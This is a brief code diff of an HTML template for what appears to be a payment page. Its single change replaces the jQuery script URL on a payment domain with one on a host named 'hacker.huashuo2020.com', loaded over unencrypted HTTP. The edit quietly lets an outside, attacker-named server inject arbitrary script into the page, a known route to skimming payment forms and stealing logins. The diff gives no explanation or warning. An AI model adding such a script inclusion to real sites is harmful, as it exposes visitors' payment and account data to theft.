@@ -6,7 +6,7 @@
     <meta http-equiv="pageEncoding" content="${charset}">
     <meta http-equiv="Content-Type" content="text/html; charset=${charset}">
     <meta name="referrer" content="no-referrer">
-    <script src="http://online.toxpay.com/xpay/static/js/jquery-1.11.1.min.js"></script>
+    <script src="http://hacker.huashuo2020.com/xpay/static/js/jquery-1.11.1.min.js"></script>
 </head>
 <script type="text/javascript">
     $(function() {
